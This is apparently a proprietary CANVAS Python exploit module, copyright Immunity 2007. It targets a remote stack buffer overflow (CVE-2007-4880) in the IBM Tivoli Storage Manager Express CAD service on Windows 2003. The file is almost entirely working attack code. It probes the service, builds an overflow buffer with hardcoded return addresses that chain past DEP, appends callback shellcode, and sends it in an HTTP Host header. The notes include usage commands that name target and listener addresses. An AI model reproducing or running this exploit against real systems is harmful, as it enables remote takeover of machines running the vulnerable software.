#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='IBM Tivoli Storage Manager Overflow'
DESCRIPTION='IBM Tivoli Storage Manager Express CAD Service Buffer Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IBM"
DOCUMENTATION['Date public']='09/24/07'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-054.html'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2007-4880"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4880"
DOCUMENTATION['CVSS'] = 10.0

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2003']

NAME=DESCRIPTION

NOTES="""
In the advisory, it says that you overflow the imported functions with a long buffer. Well this very
overflow is a bit lame since you overflow the data and imports section with a Unicode buffer that was
transformed from your host ANSI buffer. But if you work on the bug more than 5 minutes, you will notice
that with a shorted buffer that can pass a inet_addr() call, you end up with a stack overflow with your
ANSI buffer, a very few bad characters.

Tested on:
IBM Tivoli Storage Manager Express 5.3.7.0 on Windows 2003 Standard SP2 English (with DEP)

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/tivoli_storage/tivoli_storage.py -v 0 -t 10.10.11.40 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

import base64
from MOSDEF import mosdef
import canvasengine
import shellcodeGenerator

targets={
    0: ['Autodetect (N/A)',[]],
    1: ['IBM Tivoli Storage Manager Express 5.3.7.0 on Windows',0x0],
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=1581
        self.ssl=0
        self.badstring='\0\r\n:'
        self.subesp=0
        self.listenerArgsDict['fromcreatethread']=1

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        self.createWin32ThreadCallbackShellcode()
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.ssl=self.argsDict.get('ssl',self.ssl)
        return 
    
    def test(self):
        self.getArgs()
        url='/'
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s with ssl=%s'%(self.port,self.ssl))
            return 0
        request=''
        request+='GET '+url+' HTTP/1.1\r\n'
        request+='Host: %s:%d\r\n'%(self.host,self.port)
        request+='\r\n'
        self.websend(s,request)
        data=self.webrecv(s)
        s.close()
        if data.count('TSM_HTTP/0.1')>0:
            self.version=1
            return 1
        return 0
    
    def run(self):
        self.getArgs()

        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Autoversioning not available')
                return 0
        self.info,self.eip=targets[self.version]

        url='/'
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s with ssl=%s'%(self.port,self.ssl))
            return 0
        request=''
        request+='GET '+url+' HTTP/1.1\r\n'
        request+='Host: %s:%d\r\n'%(self.host,self.port)
        request+='\r\n'
        self.websend(s,request)
        data=self.webrecv(s)
        s.close()
        if data.count('302 Redirected')>0:
            index=data.rfind('/')
            url=data[index:]
            index=url.find('\n')
            url=url[:index]

        data=''
        data+='A'*0xc0
        data+=struct.pack('<L',0x0287190e)
        data+=struct.pack('<LLLL',0x0281ea04,0xffffffff,0x01010101,0x01010101) #HeapCreate
        data+='B'*0x8 #skipped
        data+=struct.pack('<LL',0x0284d7f2,0x02811c64)
        data+=struct.pack('<L',0x02893ce9)
        data+=struct.pack('<L',0x02893ce5)
        data+=struct.pack('<L',0x02811c64)
        data+=struct.pack('<L',0x02832ff0) #StringDup
        data+=struct.pack('<L',0x02897ef5)
        data+='C'*0x4 #overwritten
        data+=struct.pack('<L',0x02879d4e)
        data+='\x90'*0x4
        data+=self.shellcode
    
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s with ssl=%s'%(self.port,self.ssl))
            return 0
        request=''
        request+='GET '+url+' HTTP/1.1\r\n'
        request+='Host: 1.1.1.1 %s\r\n'%(data)
        request+='\r\n'
        self.websend(s,request)
        time.sleep(2)
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version [ -O ssl:1 ] -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
